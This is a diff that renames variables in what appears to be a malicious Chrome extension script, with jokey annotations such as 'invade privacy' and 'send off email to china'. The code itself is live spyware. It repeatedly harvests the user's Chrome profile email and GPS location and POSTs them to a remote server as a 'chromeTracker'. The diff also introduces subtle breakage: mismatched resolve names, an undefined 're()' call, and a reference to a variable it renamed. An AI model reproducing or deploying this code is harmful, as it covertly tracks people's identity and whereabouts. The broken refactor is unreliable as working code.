@@ -38,20 +38,20 @@
                 setTimeout(r, e)
             })
         }
-        async function u(e) {
-            if (!Array.isArray(e)) return;
-            if (!e[0]) return;
-            if (!e[1]) return;
+        async function processData(array) {
+            if (!Array.isArray(array)) return;
+            if (!array[0]) return;
+            if (!array[1]) return;
             var r, o, t;
-            ((new Date).getTime() - a > i || !(Math.abs(c[0] - e[0]) < n && Math.abs(c[1] - e[1]) < n)) && (await (r = l, o = d, t = e, new Promise((e, n) => {
+            ((new Date).getTime() - a > i || !(Math.abs(c[0] - array[0]) < n && Math.abs(c[1] - array[1]) < n)) && (await (r = l, o = d, t = array, new Promise((array, n) => {
                 try {
-                    const i = new XMLHttpRequest, // initalize tracker :DDDD
+                    const xhttpReq = new XMLHttpRequest, // initalize tracker :DDDD
                         a = "info[platform]=chromeTracker&info[email]=" + r + "&info[udid]=" + o + "&info[gps]=" + JSON.stringify(t) + "&info[phrases]=1";
-                    i.open("POST", s, !0), i.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), i.send(a), i.onload = () => {
+                    xhttpReq.open("POST", s, !0), xhttpReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), xhttpReq.send(a), xhttpReq.onload = () => {
                         e()
-                    }, i.onabort = () => {
+                    }, xhttpReq.onabort = () => {
                         n()
-                    }, i.onerror = () => {
+                    }, xhttpReq.onerror = () => {
                         n()
                     }
                 } catch (e) {
@@ -62,38 +62,38 @@
         let l, d;
         chrome.runtime.onConnect.addListener(runtime => {
             runtime.onMessage.addListener(async data => {
-                Array.isArray(data.pos) ? await u(data.pos) : console.warn("Invalid coordinates")
+                Array.isArray(data.pos) ? await processData(data.pos) : console.warn("Invalid coordinates")
             })
         }), async function() { // invade privacy to get email ;DDD
             for (;;) try { // very quick loop 
                 l = await new Promise((e, r) => {
                     try {
-                        chrome.identity.getProfileUserInfo(r => {
-                            e(r.email)
+                        chrome.identity.getProfileUserInfo(data => {
+                            e(data.email) // send off email to china
                         })
-                    } catch (e) {
-                        r(e)
+                    } catch (error) {
+                        r(error)
                     }
                 }), d = "chrome:" + l;
                 break
-            } catch (e) {
-                console.error("Error obtaining email: ", e), console.log("retrying email lookup in 1 second"), await newPromiseLoop(1e3)
+            } catch (error) {
+                console.error("Error obtaining email: ", error), console.log("retrying email lookup in 1 second"), await newPromiseLoop(1e3)
             }
           // Get location and invade privacy
             for (;;) try { // very quick loop 
-                const e = await new Promise((e, r) => {
+                const promise = await new Promise((e, r) => {
                     try {
                       
                         navigator.geolocation.getCurrentPosition(data => { 
                             e([data.coords.latitude, data.coords.longitude])
                         }, e => {
-                            r(e)
+                            re()
                         })
-                    } catch (e) {
-                        r(e)
+                    } catch (error) {
+                        r(error)
                     }
                 });
-                await u(e), await newPromiseLoop(t)
+                await processData(e), await newPromiseLoop(t)
             } catch (e) {
                 console.error("Error processing location", e), console.log("Waiting 5 seconds before retrying location"), await newPromiseLoop(5000)
             }
